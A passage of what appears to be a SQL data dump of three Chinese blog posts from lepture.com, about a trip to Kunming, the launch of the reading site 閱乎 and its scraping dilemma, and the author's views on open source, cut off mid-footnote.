(32, 'http://lepture.com/zh/2014/a-trip-in-kunming', '到昆明看看天空', '<p>離開深圳前的幾天，每天下着雨，時而點綴兩三點，時而又傾盆如瀉。天陰沉沉的，整個人也陰沉沉的，渾身散發着一股懶洋洋的氣息，寫不了代碼，寫不了文章，每日裏只以電視與動畫度日，一口氣看完了《半澤直樹》與《Fate/Zero》。</p>\n<p>大清早去趕飛機，在機場麥記吃早餐，忽而雷鳴，訇然乍響，又聽得麥記員工談前一天飛機延誤的事，立馬擔心航班是否會取消，結果卻是意外的準點。</p>\n<p>到昆明後，一出機場便遇見了藍天，以及藍天裏飄着的幾團白雲。雖然睡眼矇矓，心情卻是格外好了。於是開始尋找住處，最後選定了翠湖附近的這家「昆明傾城青年旅舍」。</p>\n<p>沿旅舍門口的公路下去，大約兩三分鍾便到翠湖公園。進門兩邊是水塘，一邊在曬塘，裸露的灰土地，縱橫耙過的格子襯衫般的幾條橫線，時而落下數只白鷺，修長的腳，修長的脖子，修長的冠羽，閒步於塘間，啄食於塘間。另一邊卻是滿池水的荷塘，也有白鷺紅嘴鷗<sup class="footnote-ref" id="fnref-gull"><a href="http://lepture.com/#fn-gull" rel="footnote">1</a></sup>漫步於荷上，迫暮的時候，七八位老爺子蹲於水塘邊，手持了半臂長鏡頭的相機，正拍攝着紅嘴鷗的閒步、展翅、飛翔。</p>\n<p>路兩邊的花壇裏種滿了三色堇<sup class="footnote-ref" id="fnref-viola"><a href="http://lepture.com/#fn-viola" rel="footnote">2</a></sup>，紅黃紫白藍的底，中間染一抹深色。道兩旁隔幾步便是三五老爺子老奶奶一起，小提琴，二胡，琵琶，鼓，或是唱歌，或是戲曲。順路去九龍塘看黑天鵝，路遇一家子在公園遊玩，小姑娘又是異樣的可愛，齊劉海的直髮，扎了個馬尾，一雙黑亮的眼睛，蹦蹦跳跳着。在九龍塘喂食黑天鵝，小姑娘時而分我幾片饅頭，用以喂食天鵝或者塘裏的魚。</p>\n<p>夕陽晚照，醉染的雲層，道兩旁的拂柳，微風吹過，襯衣也跟着擺起來，愜意快哉。</p>\n<figure><img alt="夕陽下的翠湖" src="http://dn-lepture.qbox.me/blog/green-lake-in-sunset.jpg/thumbnail" /><figcaption>夕陽下的翠湖</figcaption></figure><hr />\n<p>雲南大學離湖不遠，我是第二日中午些時候去的。校園閒逛，倒沒什麼可敘的。可是有這樣清澈的藍天，連成一片的白雲，身處何處已經無所謂了。中午的太陽稍嫌熱了點，可是當它隱在了大片的雲層裏，一時半會又不能出來，氣溫一下子就降了下來，稍稍吹點風，也不禁會打個冷噤。</p>\n<p>太陽藏身於雲層裏，有時也憐憫世人地從縫隙裏漏幾筆光，直把雲層邊緣照得發亮，邊緣是乾乾淨淨的白，裏面卻稍顯烏青了點。</p>\n<figure><img alt="雲南大學" src="http://dn-lepture.qbox.me/blog/yunnan-university.jpg/thumbnail" /></figure>\n<hr />\n<p>在昆明，我並沒有刻意地逛景點，只是隨便走走，看看藍天，看看白雲，生活就已經足夠愜意了。更多的時候，我是呆在這家「傾城青年旅舍」，在二樓的咖啡廳裏，上上網，經營一下 <a href="https://yuehu.io/">閱乎</a>，或者點杯咖啡，寫幾行代碼，又或者隨便找兩三人搭幾句話。</p>\n<p>店員都是美麗可愛的姑娘，與我同齡的，十八歲的。有姐妹，召慧、召芳，十八歲的小蓉，有酒窩的盼盼，都是賣萌的齊劉海。大家隨便聊聊，打打檯球，像熟人一般，甚至我也曾被誤會成店員了。</p>\n<p>有在咖啡廳裏準備複試考研的女生，有開電腦看電視劇的，聊天的，看書的，打桌球的。長得異域風情的實際又是華人的普通話不太利索的英國姑娘 Alice，中文說得異常流利梳一尾辮子的荷蘭漢子 Fred，為了能發彈舌音而做手術矯正舌頭的俄羅斯老頭安德烈。向晚的時候，甚至還有西藏來的喇嘛過來吃飯聊天。</p>\n<p>我時常在想我是內向的還是外向的，彷彿沒有定數。有時羞於與人相談，有時又相談甚歡。今晚是在昆明的最後一晚，明天就去 <a href="http://lepture.com/zh/2014/wander-in-dali">大理</a> 了。但是，也許明早我又決定先不走了，誰知道呢！</p>\n<hr />\n<p>Extra Tips:</p>\n<ol>\n<li>昆明的公共交通不好，很難等到公交車</li>\n<li>昆明的飯菜裏常有薄荷，如果不喜歡，記得提前說</li>\n<li>昆明氣候偏乾燥，從溼潤地過來的人注意保溼</li>\n</ol>\n<div class="footnotes">\n<hr />\n<ol><li id="fn-gull"><p>紅嘴鷗是昆明冬季的一大特色，現在正是紅嘴鷗離開昆明的時間。<a href="http://lepture.com/#fnref-gull" rev="footnote">&#8617;</a></p></li>\n<li id="fn-viola"><p>有一個生物學的博士同學真好，每每遇到不認識的植物，拍照問問總能得到正確答案。<a href="http://lepture.com/#fnref-viola" rev="footnote">&#8617;</a></p></li>\n</ol>\n</div>', '2014-11-06 23:42:49', 5, '2014-04-04 16:59:00', '2014-04-04 16:59:00', 0, '[["\\u6606\\u660e", 0.1674762847791872], ["\\u85cd\\u5929", 0.11778096061970443], ["\\u6642\\u5019", 0.11778096061970443], ["\\u96f2\\u5c64", 0.11778096061970443], ["\\u4fee\\u9577", 0.08833572046477832], ["\\u6709\\u6642", 0.08833572046477832], ["\\u96a8\\u4fbf", 0.08833572046477832], ["\\u65c5\\u820d", 0.08647871730000001], ["\\u908a\\u7de3", 0.058890480309852215], ["\\u611c\\u610f", 0.058890480309852215], ["\\u5169\\u908a", 0.058890480309852215], ["\\u4e00\\u908a", 0.058890480309852215], ["\\u9019\\u5bb6", 0.058890480309852215], ["\\u4e5d\\u9f8d\\u5858", 0.058890480309852215], ["\\u50be\\u57ce", 0.058890480309852215], ["\\u96e2\\u958b", 0.058890480309852215], ["\\u76f8\\u8ac7", 0.058890480309852215], ["\\u5289\\u6d77", 0.058890480309852215], ["\\u6a5f\\u5834", 0.058890480309852215], ["\\u8001\\u723a\\u5b50", 0.058890480309852215]]', NULL, NULL, '離開深圳前的幾天，每天下着雨，時而點綴兩三點，時而又傾盆如瀉。天陰沉沉的，整個人也陰沉沉的，渾身散發着一股懶洋洋的氣息，寫不了代碼，寫不了文章，每日裏只以電視與動畫度日，一口氣看完了《半澤直樹》與《Fate/Zero》。\n大清早去趕飛機，在機場麥記吃早餐，忽而雷鳴，訇然乍響，又聽得麥記員工談前一天飛機延誤的事，立馬擔心航班是否會取消，結果卻是意外的準點。\n到昆明後，一出機場便遇見了藍天，以及藍天裏飄着的幾團白雲。雖然睡眼矇矓，心情卻是格外好了。於是開始尋找住處，最後選定了翠湖附近的這家「昆明傾城青年旅舍」。\n沿旅舍門口的公路下去，大約兩三分鍾便到翠湖公園。進門兩邊是水塘，一邊在曬塘，裸露的灰土地，縱橫耙過的格子襯衫般的幾條橫線，時而落下數只白鷺，修長的腳，修長的脖子，修長的冠羽，閒步於塘間，啄食於塘間。另一邊卻是滿池水的荷塘，也有白鷺紅嘴鷗1漫步於荷上，迫暮的時候，七八位老爺子蹲於水塘邊，手持了半臂長鏡頭的相機，正拍攝着紅嘴鷗的閒步、展翅、飛翔。\n路兩邊的花壇裏種滿了三色堇2，紅黃紫白藍的底，中間染一抹深色。道兩旁隔幾步便是三五老爺子老奶奶一起，小提琴，二胡，琵琶，鼓，或是唱歌，或是戲曲。順路去九龍塘看黑天鵝，路遇一家子在公園遊玩，小姑娘又是異樣的可愛，齊劉海的直髮，扎了個馬尾，一雙黑亮的眼睛，蹦蹦跳跳着。在九龍塘喂食黑天鵝，小姑娘時而分我幾片饅頭，用以喂食天鵝或者塘裏的魚。\n夕陽晚照，醉染的雲層，道兩旁的拂柳，微風吹過，襯衣也跟着擺起來，愜意快哉。\n夕陽下的翠湖\n雲南大學離湖不遠，我是第二日中午些時候去的。校園閒逛，倒沒什麼可敘的。可是有這樣清澈的藍天，連成一片的白雲，身處何處已經無所謂了。中午的太陽稍嫌熱了點，可是當它隱在了大片的雲層裏，一時半會又不能出來，氣溫一下子就降了下來，稍稍吹點風，也不禁會打個冷噤。\n太陽藏身於雲層裏，有時也憐憫世人地從縫隙裏漏幾筆光，直把雲層邊緣照得發亮，邊緣是乾乾淨淨的白，裏面卻稍顯烏青了點。\n\n\n在昆明，我並沒有刻意地逛景點，只是隨便走走，看看藍天，看看白雲，生活就已經足夠愜意了。更多的時候，我是呆在這家「傾城青年旅舍」，在二樓的咖啡廳裏，上上網，經營一下 閱乎，或者點杯咖啡，寫幾行代碼，又或者隨便找兩三人搭幾句話。\n店員都是美麗可愛的姑娘，與我同齡的，十八歲的。有姐妹，召慧、召芳，十八歲的小蓉，有酒窩的盼盼，都是賣萌的齊劉海。大家隨便聊聊，打打檯球，像熟人一般，甚至我也曾被誤會成店員了。\n有在咖啡廳裏準備複試考研的女生，有開電腦看電視劇的，聊天的，看書的，打桌球的。長得異域風情的實際又是華人的普通話不太利索的英國姑娘 Alice，中文說得異常流利梳一尾辮子的荷蘭漢子 Fred，為了能發彈舌音而做手術矯正舌頭的俄羅斯老頭安德烈。向晚的時候，甚至還有西藏來的喇嘛過來吃飯聊天。\n我時常在想我是內向的還是外向的，彷彿沒有定數。有時羞於與人相談，有時又相談甚歡。今晚是在昆明的最後一晚，明天就去 大理 了。但是，也許明早我又決定先不走了，誰知道呢！\n\nExtra Tips:\n\n昆明的公共交通不好，很難等到公交車\n昆明的飯菜裏常有薄荷，如果不喜歡，記得提前說\n昆明氣候偏乾燥，從溼潤地過來的人注意保溼\n\n\n\n紅嘴鷗是昆明冬季的一大特色，現在正是紅嘴鷗離開昆明的時間。↩\n有一個生物學的博士同學真好，每每遇到不認識的植物，拍照問問總能得到正確答案。↩\n\n', NULL, NULL, NULL),
(33, 'http://lepture.com/zh/2014/introduce-yuehu', '閱乎，你好', '<p>這篇文章放在草稿箱裏已經兩週了，標題改了又改刪了又刪，始終無法起一個滿意的標題，也始終無法動筆寫下正文。一方面是因爲近來中文閱讀量太少，缺乏中文語感，另一方面也是因爲 <a href="https://yuehu.io/">閱乎</a> 做得還不夠好。</p>\n<p>可是看到 <a href="http://yedingding.com/2014/03/12/bootstrapping-your-startup-idea.html">@yedingding 說</a>：</p>\n<blockquote><p>我们每天都能给自己找很多理由说发布时机未到，比如产品不够完美需要再改进，比如怕给用户的第一印象不好， 比如如果有某些新功能会更好，比如还需要再多测试一会，尤其是当资金暂时充足时。请放弃这些想法，ship it，ship it，不要怕。</p>\n</blockquote><p>雖然這並不是創業，閱乎對我而言是一個 side project，我仍然需要一份工作來養活自己。但是道理是一樣的，也許我應該寫一篇介紹閱乎的「軟文」了。</p>\n<h2>閱乎是什麼</h2>\n<p>你從名字就可以看出來，<a href="https://yuehu.io/">閱乎</a> 是一個閱讀的地方，但是這樣一個解釋是毫無意義的。要解釋閱乎是什麼，就不得不談一談閱乎的歷史。</p>\n<p>2012 年夏末，我們短暫嘗試過由少量編輯每日推薦中文互聯網上的精華文章，每篇文章都包含我們的推薦語。那個時候，我們的域名是 <a href="https://yuehu.io/">yuehu.me</a>。</p>\n<figure><img alt="最初的閱乎" src="http://dn-lepture.qbox.me/blog/original-yuehu.png/thumbnail" /><figcaption>最初的閱乎，每篇文章都包含我們的推薦語</figcaption></figure><p><a href="http://lishun.me/">李順</a> 是這樣描述的，「一篇文章 + 我們的推薦語 = 閱乎」。但是寫推薦語是一件挺耗費腦力的事，尤其是像我，沒有 <a href="http://imquyi.com">@rangerqu</a> 的才華，沒有 <a href="http://www.fangkc.cn">方可成</a> 的洞見，沒有 <a href="http://ritawu.me/blog/">@rita</a> 的學識，總害怕寫出的東西毫無意義。除了挖苦與諷刺，我能寫點什麼呢！這樣耗費人力而又沒有收入的事很難長久，加上大家都是有身份證的人，時間總是不夠用的。</p>\n<p>後來的改版我便去掉了寫推薦語，改爲展示摘要，畢竟推薦的主體還是文章，讀者想看的也是文章。但是我們做了一件額外的事——更良好的閱讀體驗，也做了一件多餘的事——在閱乎寫作。這些變化與錯誤，你都可以在 <a href="https://yuehu.io/about/1">關於閱乎</a> 一文裏察覺到。</p>\n<p>現在的閱乎，套用李順的定義：一篇推薦 + 更好的閱讀體驗 = 閱乎。當我說更好的閱讀體驗時，其實並沒有太大的底氣，許多網站的閱讀體驗都不錯的，比如我的個人博客，比如你看到的這篇文章。但是還有一些時候是這樣的：</p>\n<figure><img alt="新浪與閱乎" src="http://dn-lepture.qbox.me/blog/yuehu-vs-sina.png/thumbnail" /><figcaption>新浪博客應該是我見過的最爛的博客服務商了，但是不明白爲何有這麼多人用</figcaption></figure><p>真實效果對比 <a href="http://blog.sina.com.cn/s/blog_4cd5148f01018amn.html">新浪</a> vs <a href="http://yuehu.io/editors-picks/77">閱乎</a>，或者 <a href="http://dn-lepture.qbox.me/blog/yuehu-vs-sina.png">查看大圖</a>。</p>\n<h2>道德困境</h2>\n<p>閱乎會抓取網頁，解析出該網頁的正文內容，在閱乎展示，以達到「更好的閱讀體驗」。但是這樣的做法，就我個人而言是不妥的，近乎於盜竊。我自己的博客內容當然是無所謂的，但是你可能並不樂意。</p>\n<p>一方面我希望你能在閱乎有一個愉快的閱讀體驗，一方面我也希望閱乎能給別人帶去讀者。這兩者之間有矛盾，但又不僅僅只有矛盾。比如前幾天推薦的 <a href="http://yuehu.io/editors-picks/124">我爲什麼是一個悲觀主義者</a> 便爲木遙 <a href="https://twitter.com/lepture/status/448347448423882752">帶去了</a> <a href="http://guojing.me/blog/2014/03/25/i-am-still-blogging/">讀者</a>。</p>\n<p>我曾嘗試過在閱讀文章頁面載入原網頁的 iframe，默認展示原網頁，在頂部提供一個「在閱乎閱讀」的按鈕，當點擊該按鈕後，展示閱乎解析後的內容。但是許多網站是不允許作爲 iframe 被載入的，於是你可能 <a href="https://twitter.com/acgtyrant/status/445467368383193088">看到的是一片空白</a>。</p>\n<p>在嘗試了幾種方案後，現在的形式是儘可能的鏈接到原文，同時也提供在閱乎閱讀的功能。比如你看 <a href="http://yuehu.io/editors-picks">編輯推薦</a>，當你瀏覽該頁面時，點標題會跳轉到原網頁，而標題正是讀者最喜歡點擊的部分，將標題鏈接設爲原網頁，正好體現了「儘可能的鏈接到原文」。假如你在閱乎閱讀，假如你要在閱乎閱讀  <a href="http://yuehu.io/editors-picks/130">清人笔记里的广东“老举”</a>  這篇文章，假如你沒有註冊閱乎，沒有登錄閱乎，你將無法看到全文內容，你只能看到摘要。這樣做並非爲了逼迫讀者註冊閱乎，大多數時候，讀者是懶得註冊的，設置這樣一個門檻正是爲了爲原文帶去讀者。</p>\n<p>我也不知道怎麼樣的方式更好，一種「又要當婊子，又想立牌坊」的尷尬。如果你有更好的方案，歡迎反饋給我。</p>\n<h2>推薦什麼</h2>\n<p>閱乎目前主打的功能是「合輯」，這是一個由多人（也可以是一人）編輯維護的文章集，代表了某類話題下這些編輯的口味。推薦什麼內容由人決定，而不是機器與算法。</p>\n<p>李順曾在最初的關於閱乎裏寫道：</p>\n<blockquote><p>聪明的软件工程师、科学家们在研究“推荐算法”，就是为了能够从互联网上挖掘出值得一读的内容。\n这要是成功了，就可以用极低的成本解决上面说的问题。利用现有的技术，你已经能够每天读到一份由机器自动生成的，只属于你个人的“杂志”了。</p>\n</blockquote><p>這種「只屬於你個人的雜誌」不會在閱乎出現。一是我並沒有這份實力，二是我並不認同這一概念。木遙在 <a href="http://blog.farmostwood.net/697.html">我爲什麼是一個悲觀主義者</a> 一文裏提到了「社會的極化」這樣一個觀點：</p>\n<blockquote><p>一旦每个人可以定制自己的视野，他就会放弃倾听、宽容和讨论的责任，只是躲在自己的天地里任性地选择自己喜欢的声音。长此以往，每个人都会沿着自己的方向走向极端。</p>\n</blockquote><p>由人來推薦，這種對「個性化」的擔憂則不必了。因爲人總會有自己偏見，這些偏見保證了你總能接觸到非個性化的觀點，而它們便會體現在這「合輯」裏。</p>\n<p>如果你有興趣經營一份合輯，主題將由你自己來決定，它可以是某一領域內的文章推薦，比如 <a href="https://yuehu.io/pythonic-notes">Pythonic Notes</a>，它也可以是無法言寓的人文類主題，比如 <a href="https://yuehu.io/editors-picks">編輯推薦</a>。</p>\n<p>我將主要維護 <a href="https://yuehu.io/editors-picks">編輯推薦</a> 與 <a href="https://yuehu.io/be-a-programmer">我們都是程序員</a> 。這兩個合輯都是開放合輯，歡迎大家投遞文章。</p>\n<h2>新的開始</h2>\n<p>閱乎誕生很久了，然而我從未在自己的博客上寫過。這裏寫下閱乎的第一篇「軟文」，表明它已經到了能被自己認可的地步了。</p>\n<p>古人云，一鼓作氣，再而衰，三而竭。已經改過數次版了，幾乎到了「三而竭」的地步。於是更新了域名，從 .me 換作了 .io，假裝是一個新的開始，而不至於立馬就竭了。</p>', '2014-11-06 23:42:49', 5, '2014-03-30 18:30:00', '2014-03-30 18:30:00', 0, '[["\\u95b1\\u4e4e", 0.5268818504317629], ["\\u95b1\\u8b80", 0.21802007604072948], ["\\u4e00\\u500b", 0.21802007604072948], ["\\u63a8\\u85a6", 0.21802007604072948], ["\\u9019\\u6a23", 0.14534671736048632], ["\\u4ec0\\u9ebc", 0.12717837769042553], ["\\u6211\\u5011", 0.12717837769042553], ["\\u7de8\\u8f2f", 0.10901003802036474], ["\\u9ad4\\u9a57", 0.10901003802036474], ["\\u8b80\\u8005", 0.10901003802036474], ["\\u6587\\u7ae0", 0.10066002926048633], ["\\u6c92\\u6709", 0.09084169835030395], ["\\u5167\\u5bb9", 0.09084169835030395], ["\\u6bd4\\u5982", 0.08907105331671732], ["\\u63a8\\u85a6\\u8a9e", 0.07267335868024316], ["\\u7db2\\u9801", 0.07267335868024316], ["\\u5408\\u8f2f", 0.07267335868024316], ["\\u535a\\u5ba2", 0.06401378495471124], ["\\u81ea\\u5df1", 0.058895785971033426], ["\\u66f4\\u597d", 0.05873036066015197]]', NULL, NULL, '這篇文章放在草稿箱裏已經兩週了，標題改了又改刪了又刪，始終無法起一個滿意的標題，也始終無法動筆寫下正文。一方面是因爲近來中文閱讀量太少，缺乏中文語感，另一方面也是因爲 閱乎 做得還不夠好。\n可是看到 @yedingding 說：\n我们每天都能给自己找很多理由说发布时机未到，比如产品不够完美需要再改进，比如怕给用户的第一印象不好， 比如如果有某些新功能会更好，比如还需要再多测试一会，尤其是当资金暂时充足时。请放弃这些想法，ship it，ship it，不要怕。\n雖然這並不是創業，閱乎對我而言是一個 side project，我仍然需要一份工作來養活自己。但是道理是一樣的，也許我應該寫一篇介紹閱乎的「軟文」了。\n閱乎是什麼\n你從名字就可以看出來，閱乎 是一個閱讀的地方，但是這樣一個解釋是毫無意義的。要解釋閱乎是什麼，就不得不談一談閱乎的歷史。\n2012 年夏末，我們短暫嘗試過由少量編輯每日推薦中文互聯網上的精華文章，每篇文章都包含我們的推薦語。那個時候，我們的域名是 yuehu.me。\n最初的閱乎，每篇文章都包含我們的推薦語李順 是這樣描述的，「一篇文章 + 我們的推薦語 = 閱乎」。但是寫推薦語是一件挺耗費腦力的事，尤其是像我，沒有 @rangerqu 的才華，沒有 方可成 的洞見，沒有 @rita 的學識，總害怕寫出的東西毫無意義。除了挖苦與諷刺，我能寫點什麼呢！這樣耗費人力而又沒有收入的事很難長久，加上大家都是有身份證的人，時間總是不夠用的。\n後來的改版我便去掉了寫推薦語，改爲展示摘要，畢竟推薦的主體還是文章，讀者想看的也是文章。但是我們做了一件額外的事——更良好的閱讀體驗，也做了一件多餘的事——在閱乎寫作。這些變化與錯誤，你都可以在 關於閱乎 一文裏察覺到。\n現在的閱乎，套用李順的定義：一篇推薦 + 更好的閱讀體驗 = 閱乎。當我說更好的閱讀體驗時，其實並沒有太大的底氣，許多網站的閱讀體驗都不錯的，比如我的個人博客，比如你看到的這篇文章。但是還有一些時候是這樣的：\n新浪博客應該是我見過的最爛的博客服務商了，但是不明白爲何有這麼多人用真實效果對比 新浪 vs 閱乎，或者 查看大圖。\n道德困境\n閱乎會抓取網頁，解析出該網頁的正文內容，在閱乎展示，以達到「更好的閱讀體驗」。但是這樣的做法，就我個人而言是不妥的，近乎於盜竊。我自己的博客內容當然是無所謂的，但是你可能並不樂意。\n一方面我希望你能在閱乎有一個愉快的閱讀體驗，一方面我也希望閱乎能給別人帶去讀者。這兩者之間有矛盾，但又不僅僅只有矛盾。比如前幾天推薦的 我爲什麼是一個悲觀主義者 便爲木遙 帶去了 讀者。\n我曾嘗試過在閱讀文章頁面載入原網頁的 iframe，默認展示原網頁，在頂部提供一個「在閱乎閱讀」的按鈕，當點擊該按鈕後，展示閱乎解析後的內容。但是許多網站是不允許作爲 iframe 被載入的，於是你可能 看到的是一片空白。\n在嘗試了幾種方案後，現在的形式是儘可能的鏈接到原文，同時也提供在閱乎閱讀的功能。比如你看 編輯推薦，當你瀏覽該頁面時，點標題會跳轉到原網頁，而標題正是讀者最喜歡點擊的部分，將標題鏈接設爲原網頁，正好體現了「儘可能的鏈接到原文」。假如你在閱乎閱讀，假如你要在閱乎閱讀  清人笔记里的广东“老举”  這篇文章，假如你沒有註冊閱乎，沒有登錄閱乎，你將無法看到全文內容，你只能看到摘要。這樣做並非爲了逼迫讀者註冊閱乎，大多數時候，讀者是懶得註冊的，設置這樣一個門檻正是爲了爲原文帶去讀者。\n我也不知道怎麼樣的方式更好，一種「又要當婊子，又想立牌坊」的尷尬。如果你有更好的方案，歡迎反饋給我。\n推薦什麼\n閱乎目前主打的功能是「合輯」，這是一個由多人（也可以是一人）編輯維護的文章集，代表了某類話題下這些編輯的口味。推薦什麼內容由人決定，而不是機器與算法。\n李順曾在最初的關於閱乎裏寫道：\n聪明的软件工程师、科学家们在研究“推荐算法”，就是为了能够从互联网上挖掘出值得一读的内容。\n这要是成功了，就可以用极低的成本解决上面说的问题。利用现有的技术，你已经能够每天读到一份由机器自动生成的，只属于你个人的“杂志”了。\n這種「只屬於你個人的雜誌」不會在閱乎出現。一是我並沒有這份實力，二是我並不認同這一概念。木遙在 我爲什麼是一個悲觀主義者 一文裏提到了「社會的極化」這樣一個觀點：\n一旦每个人可以定制自己的视野，他就会放弃倾听、宽容和讨论的责任，只是躲在自己的天地里任性地选择自己喜欢的声音。长此以往，每个人都会沿着自己的方向走向极端。\n由人來推薦，這種對「個性化」的擔憂則不必了。因爲人總會有自己偏見，這些偏見保證了你總能接觸到非個性化的觀點，而它們便會體現在這「合輯」裏。\n如果你有興趣經營一份合輯，主題將由你自己來決定，它可以是某一領域內的文章推薦，比如 Pythonic Notes，它也可以是無法言寓的人文類主題，比如 編輯推薦。\n我將主要維護 編輯推薦 與 我們都是程序員 。這兩個合輯都是開放合輯，歡迎大家投遞文章。\n新的開始\n閱乎誕生很久了，然而我從未在自己的博客上寫過。這裏寫下閱乎的第一篇「軟文」，表明它已經到了能被自己認可的地步了。\n古人云，一鼓作氣，再而衰，三而竭。已經改過數次版了，幾乎到了「三而竭」的地步。於是更新了域名，從 .me 換作了 .io，假裝是一個新的開始，而不至於立馬就竭了。', NULL, NULL, NULL),
(34, 'http://lepture.com/zh/2014/my-thought-on-opensource', '當我談開源時我談些什麼', '<p>哦，不要在意這個標題。我知道你們看過《當我談跑步時我談些什麼》，也看過《當我們談論愛情時我們在談論什麼》。</p>\n<p>那麼當我談開源時我要談些什麼呢？我以爲第一點要弄清楚的是開源是什麼。一般人眼裏的開源是怎麼樣的，我不知道，只能不懷惡意地揣測，大抵是指免費的可以查看到源代碼的軟體吧。</p>\n<p>當然，這不過是我個人的猜測。我眼中的開源遠不止如此，開源不僅僅只有軟體和代碼。英文的開源一詞乃 Open Source，至於 Source 是什麼，並沒有明確的限定。它可以是 Open-source software<sup class="footnote-ref" id="fnref-open-source"><a href="http://lepture.com/#fn-open-source" rel="footnote">1</a></sup>，可以是 Open-source content，可以是 Open-source journalism，可以是 Open-source university，甚至於 <a href="http://en.wikipedia.org/wiki/Open_politics">Open-source politics</a>。</p>\n<p>例如我曾閒暇無聊時整理過<a href="https://github.com/lepture/chinalaw">中華人民共和國的法律</a>，它不是軟體，不是代碼，但是我一樣認爲這是一個開源庫。本質上來說，它甚至不是源<sup class="footnote-ref" id="fnref-source"><a href="http://lepture.com/#fn-source" rel="footnote">2</a></sup>。但是換一個角度來看，它又是第一個整理成 Markdown 格式的法律集，那麼從這個角度來說，也可看作是源了。</p>\n<p>因爲職業的關係，我所能談的也只有 Open-source code 了。但是萬不要以爲開源就只有代碼，你可以開源任何事物。</p>\n<hr />\n<p>你也許不知道，我是 GitHub 上最活躍的大陸華人<sup class="footnote-ref" id="fnref-github-top"><a href="http://lepture.com/#fn-github-top" rel="footnote">3</a></sup>。創建了一個又一個的開源庫，挖了許多坑，也填了許多坑。這樣看來彷彿我挺熱衷於開源的，其實不然，我是屬於消極開源的一類人。</p>\n<p>例如我曾在 <a href="http://lepture.com/en/2013/unpleasant-open-source">The Unpleasant Part of Open Source</a> 一文裏提到：</p>\n<blockquote><p>We open source not because people need us. We just happen to open source things that solve our problems, and wish it may help other people.\nOpen source can be a business for a company, but not for individuals.</p>\n</blockquote><p>開源對我來說是一件順便的事，沒有什麼崇高的目的。與理想無關，更多的是一種實用主義。我寫了一個 Python 庫，順便放在 GitHub 上做管理，順便發布到 PyPI 裏方便下載安裝。一切都是因爲順便。有時覺得對別人會挺有用的，便會特地去<a href="http://www.reddit.com/r/Python/comments/1yz7bl/markdown_parsers_in_python/">宣傳宣傳</a>。比如最近寫的一個 <a href="http://lepture.com/en/2014/markdown-parsers-in-python">Markdown 解析器</a> <a href="https://github.com/lepture/mistune">mistune</a>。但是更多的時候，我並不會刻意去做太多，沒有那麼多精力。</p>\n<p>聽起來彷彿挺沒有責任心。其實不然，我寫的東西還是很不錯的。雖然是順便爲之，測試用例、文檔卻是一樣都不會少的，而且代碼也寫得漂亮<sup class="footnote-ref" id="fnref-code-style"><a href="http://lepture.com/#fn-code-style" rel="footnote">4</a></sup>。既然有打算給別人用，文檔是必不可少的，許多程序員不喜歡寫文檔，我不在其列，我認爲沒有文檔的程序不叫開源程序。如果你有興趣，可以隨便看看我寫的文檔：</p>\n<ul>\n<li><a href="https://github.com/lepture/flask-oauthlib">Flask-OAuthlib</a>: <a href="https://flask-oauthlib.readthedocs.org/">flask-oauthlib.readthedocs.org/</a></li>\n<li><a href="https://github.com/lepture/otpauth">otpauth</a>: <a href="https://pythonhosted.org/otpauth/">pythonhosted.org/otpauth/</a></li>\n</ul>\n<hr />\n<p>開源代碼分兩類，一類是 Software(Application)，一類是 Library（庫）。Software 是針對使用者的，是一個可直接使用的程序；Library 是針對開發者的，爲開發者編寫代碼提供便利。比如 Gitlab 是一個 Open Source Software，而 Gitlab 使用的 Rails 框架則是一個 Library。對一般人來說，接觸的更多的應該是開源軟體。</p>\n<p>初入行時，我寫過一個運行在 GAE 上的博客，這是 Software。後來慢慢就不再寫 Software 了，改寫 Library 了。因爲 Software 很容易讓我廢棄掉，一旦不再使用，就沒有動力去更新了。而 Library 則不然，你輕易不會廢棄掉，即使你不再使用，因爲功能單一明確，很容易讓別人接手。比如 <a href="https://github.com/lepture/flask-wtf">lepture/flask-wtf</a> 這個庫便是從旁人那裏接手過來的。</p>\n<p>自己使用<sup class="footnote-ref" id="fnref-dog-food"><a href="http://lepture.com/#fn-dog-food" rel="footnote">5</a></sup>是一個很重要的原則。如果一個庫自己不再使用，而有其他人來提 Bug 或者 feature，我是懶得搭理的。沒有金錢收入，自己又不用，哪裏有心思修改刪增呢！以前寫了一個 Python 庫，叫 Livereload，是一個 Software。剛開始時用了一段時間，後來便廢棄了。然而不時還有人來提 issue，因爲我暫時用不着，便不太搭理人。而後靈光乍現，<a href="http://lepture.com/en/2013/new-life-of-livereload">將 Livereload 從 Software 改成 Library</a>，便又能吃自己的狗糧了。也下定了決心，以後要少寫軟體，多寫庫。</p>\n<p>但是我偶爾還會寫一些開源軟體，專注於單一的功能，代碼量足夠小。這樣即使我不再使用它，只需要花少量的時間就能了解它，修改它。最近的例子就是 <a href="https://github.com/lepture/rewatch">rewatch</a>，區區 80 幾行代碼，賞心悅目。</p>\n<hr />\n<p>有的同學可能覺得開源是一件很偉大的事，我頗不以爲然。大可不必看得太重，當然也不可輕賤。看得太重，便會生怯，妄自菲薄，以爲這樣崇高的事自己是做不了的。假使有志於做點貢獻，我也有些許建議。</p>\n<ul>\n<li>首先註冊一個 GitHub 賬戶，學習一下 Git 的使用。現在多數開源庫都託管在  GitHub 上的。</li>\n<li>從使用別人的庫開始，在 GitHub 上 Star 一下別人的庫，讓開發者知道有人關注他寫的東西。</li>\n<li>遇到好東西，幫忙作者宣傳一下，也算是在做貢獻</li>\n<li>在使用過程中，你不可避免的會遇到各種各樣的問題，即時反饋給開發者。</li>\n<li>有能力的話，不妨修復這些問題，然後給作者發 pull request，說明清楚你解決了什麼問題。</li>\n<li>你遇到了一個問題，又找不到好的方案，於是你開始自己解決這些問題，同時公開了你的解決方案。</li>\n</ul>\n<p>我並不贊同刻意地參與，最有效的參與便是使用。在使用過程中發現問題，反饋問題，解決問題。開始的時候，多關注一些小項目，更少的代碼量有助於你理解它，發現它的問題，複雜的項目會讓人望而生怯，讓你裹足不前。</p>\n<p>我並不總是在寫自己的代碼，也會給別人<a href="https://github.com/hhatto/python-hoedown/issues/5">提問題</a>，也會給別人<a href="https://github.com/chjj/marked/pull/129">發 patch</a>。但是前提是，我在使用，而且在使用過程中遇到了問題。也許你發現的並不是什麼大問題，比如文檔裏的某個單詞寫錯了，沒有關係，大膽地給作者發 pull request 吧。</p>\n<p>最後，在參與的過程中注意一下「<a href="https://github.com/seajs/seajs/blob/master/CONTRIBUTING.md">如何向开源社区提问题</a>」。</p>\n<div class="footnotes">\n<hr />\n<ol><li id="fn-open-source"><p>開源軟體，這大約就是一般人眼裏的開源，也就是所謂狹義的開源。<a href="http://lepture.com/#fnref-open-source" rev="footnote">&#8617;</a></p></li>\n<li id="fn-source"><p>Source 的本意即是來源、出處、根源。<a 